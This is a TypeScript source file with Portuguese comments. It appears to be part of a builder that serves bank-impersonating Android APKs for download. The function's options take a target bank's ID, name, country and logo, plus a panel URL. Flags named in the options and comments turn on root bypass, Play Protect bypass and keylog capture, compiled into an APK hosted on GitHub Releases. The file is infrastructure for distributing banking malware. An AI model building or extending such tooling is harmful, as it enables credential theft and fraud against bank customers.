import fs from 'fs';
import path from 'path';
import https from 'https';
import http from 'http';

/**
 * Baixa APK pré-compilado do GitHub e serve como download.
 * Os flags (root bypass, play protect, keylog) já devem estar compilados na APK base.
 * 
 * Para produção: compile o APK no Android Studio com todos os flags ativos,
 * faça upload para GitHub Releases e configure APK_GITHUB_URL no Railway.
 */
export async function generateAPK(options: {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  logoUrl?: string;
  panelUrl: string;
  bankId: string;
  bankCountry: string;
  bankName: string;
  enableRootBypass?: boolean;
  enablePlayProtectBypass?: boolean;
  enableKeylogCapture?: boolean;
}): Promise<Buffer> {
  const githubAPKUrl = process.env.APK_GITHUB_URL || '';

  if (!githubAPKUrl) {
    throw new Error(
      'APK_GITHUB_URL não configurada. Configure a variável de ambiente no Railway com a URL do APK no GitHub Releases.'
    );
  }

  console.log(`[APK Generator] Baixando APK de ${githubAPKUrl}`);
  const apkBuffer = await downloadFile(githubAPKUrl);

  if (!looksLikeApk(apkBuffer)) {
    throw new Error('Arquivo baixado não parece um APK válido (não é ZIP/APK)');
  }

  console.log(`[APK Generator] APK baixado com sucesso: ${apkBuffer.length} bytes`);
  return apkBuffer;
}

/**
 * Baixa arquivo seguindo redirecionamentos
 */
function downloadFile(url: string, redirectCount = 0): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    if (redirectCount > 5) {
      reject(new Error('Muitos redirecionamentos ao baixar APK'));
      return;
    }

    const protocol = url.startsWith('https') ? https : http;

    protocol.get(url, { timeout: 30000 }, (res) => {
      const statusCode = res.statusCode ?? 0;
      const location = res.headers.location;

      if ([301, 302, 303, 307, 308].includes(statusCode) && location) {
        const redirectUrl = new URL(location, url).toString();
        res.resume();
        downloadFile(redirectUrl, redirectCount + 1).then(resolve).catch(reject);
        return;
      }

      if (statusCode !== 200) {
        reject(new Error(`HTTP ${statusCode}: ${res.statusMessage}`));
        return;
      }

      const chunks: Buffer[] = [];
      res.on('data', (chunk) => chunks.push(chunk));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    }).on('error', reject);
  });
}

function looksLikeApk(buffer: Buffer): boolean {
  // APK é um ZIP: começa com PK\x03\x04
  return buffer.length >= 4 && buffer[0] === 0x50 && buffer[1] === 0x4b;
}
